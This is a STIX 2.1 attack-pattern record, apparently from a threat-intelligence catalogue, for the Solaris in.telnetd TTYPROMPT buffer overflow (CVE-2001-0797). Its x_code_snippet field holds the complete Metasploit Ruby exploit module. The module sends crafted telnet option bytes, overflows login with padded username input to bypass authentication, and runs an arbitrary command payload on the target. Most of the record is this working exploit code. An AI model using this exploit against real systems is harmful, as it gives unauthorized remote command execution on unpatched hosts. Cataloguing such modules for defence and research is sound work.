{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5139831-a59d-494e-912d-e0b5e825ea4a",
    "created": "2024-08-14T16:33:55.562205Z",
    "modified": "2024-08-14T16:33:55.56221Z",
    "name": "Solaris in.telnetd TTYPROMPT Buffer Overflow",
    "description": " This module uses a buffer overflow in the Solaris 'login' application to bypass authentication in the telnet daemon. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/telnet/ttyprompt.rb",
            "external_id": "ttyprompt.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0797"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solaris in.telnetd TTYPROMPT Buffer Overflow',\n      'Description'    => %q{\n        This module uses a buffer overflow in the Solaris 'login'\n      application to bypass authentication in the telnet daemon.\n      },\n      'Author'         => [ 'MC', 'cazz' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2001-0797'],\n          [ 'OSVDB', '690'],\n          [ 'BID', '5531'],\n\n        ],\n      'Privileged'     => false,\n      'Platform'       => %w{ solaris unix },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          ['Automatic', { }],\n        ],\n      'DisclosureDate' => '2002-01-18',\n      'DefaultTarget' => 0))\n\n      register_options(\n        [\n          Opt::RPORT(23),\n          OptString.new('USER', [ true, \"The username to use\",     \"bin\" ]),\n        ])\n  end\n\n  def exploit\n    connect\n\n    banner = sock.get_once\n\n    print_status('Setting TTYPROMPT...')\n\n    req =\n      \"\\xff\\xfc\\x18\" +\n      \"\\xff\\xfc\\x1f\" +\n      \"\\xff\\xfc\\x21\" +\n      \"\\xff\\xfc\\x23\" +\n      \"\\xff\\xfb\\x22\" +\n      \"\\xff\\xfc\\x24\" +\n      \"\\xff\\xfb\\x27\" +\n      \"\\xff\\xfb\\x00\" +\n      \"\\xff\\xfa\\x27\\x00\" +\n      \"\\x00TTYPROMPT\" +\n      \"\\x01\" +\n      rand_text_alphanumeric(6) +\n      \"\\xff\\xf0\"\n\n    sock.put(req)\n    select(nil,nil,nil,0.25)\n\n    print_status('Sending username...')\n\n    filler = rand_text_alpha(rand(10) + 1)\n\n    req << datastore['USER'] + (\" #{filler}\" * 65)\n\n    sock.put(req + \"\\n\\n\\n\")\n\n    select(nil,nil,nil,0.25)\n    sock.get_once\n\n    sock.put(\"nohup \" + payload.encoded + \" >/dev/null 2>&1\\n\")\n\n    select(nil,nil,nil,0.25)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-01-18",
    "x_mitre_platforms": [
        "%w{ solaris unix }"
    ]
}